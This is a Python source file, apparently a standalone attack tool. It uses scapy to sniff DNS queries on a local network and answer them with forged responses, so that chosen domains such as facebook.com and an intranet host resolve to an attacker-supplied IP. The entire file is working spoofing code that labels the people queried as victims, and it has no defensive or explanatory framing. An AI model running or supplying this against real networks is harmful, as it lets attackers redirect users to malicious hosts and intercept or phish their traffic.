from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff, conf

# You can modify this list to spoof specific domains only
TARGET_DOMAINS = [
    "facebook.com",
    "intranet.local",
    "example.com"
]

def spoof_dns_packet(pkt, fake_ip, iface):
    if pkt.haslayer(DNSQR) and pkt.haslayer(UDP) and pkt[DNS].qr == 0:
        try:
            queried_domain = pkt[DNSQR].qname.decode().strip(".")
            if TARGET_DOMAINS and queried_domain not in TARGET_DOMAINS:
                print("[-] Ignored domain:", queried_domain)
                return

            victim_ip = pkt[IP].src
            victim_port = pkt[UDP].sport
            dns_id = pkt[DNS].id

            print("\n[>] Intercepted DNS query from {} for {}".format(victim_ip, queried_domain))

            ip_layer = IP(src=pkt[IP].dst, dst=victim_ip)
            udp_layer = UDP(sport=pkt[UDP].dport, dport=victim_port)

            dns_answer = DNSRR(
                rrname=pkt[DNSQR].qname,
                type="A",
                rclass="IN",
                ttl=300,
                rdata=fake_ip
            )

            dns_layer = DNS(
                id=dns_id,
                qr=1,
                aa=1,
                rd=pkt[DNS].rd,
                ra=1,
                qd=pkt[DNS].qd,
                an=dns_answer,
                ancount=1,
                nscount=0,
                arcount=0
            )

            spoofed_response = ip_layer / udp_layer / dns_layer

            # Force recalculation of headers
            del spoofed_response[IP].len
            del spoofed_response[IP].chksum
            del spoofed_response[UDP].len
            del spoofed_response[UDP].chksum

            send(spoofed_response, iface=iface, verbose=0)
            print("[+] Sent spoofed DNS response with {} to {}".format(fake_ip, victim_ip))

        except Exception as e:
            print("[!] Error processing DNS packet: {}".format(e))

def start_dns_spoofer(fake_ip, iface):
    print("[*] DNS spoofing started")
    print("[*] Fake IP to inject: {}".format(fake_ip))
    print("[*] Listening on interface: {}".format(iface))
    print("[*] Spoofing domains: {}".format(", ".join(TARGET_DOMAINS) if TARGET_DOMAINS else "All domains"))

    conf.iface = iface

    try:
        sniff(
            iface=iface,
            filter="udp port 53",
            prn=lambda pkt: spoof_dns_packet(pkt, fake_ip, iface),
            store=False
        )
    except KeyboardInterrupt:
        print("\n[!] DNS spoofing stopped.")
    except Exception as e:
        print("[!] Error during sniffing: {}".format(e))
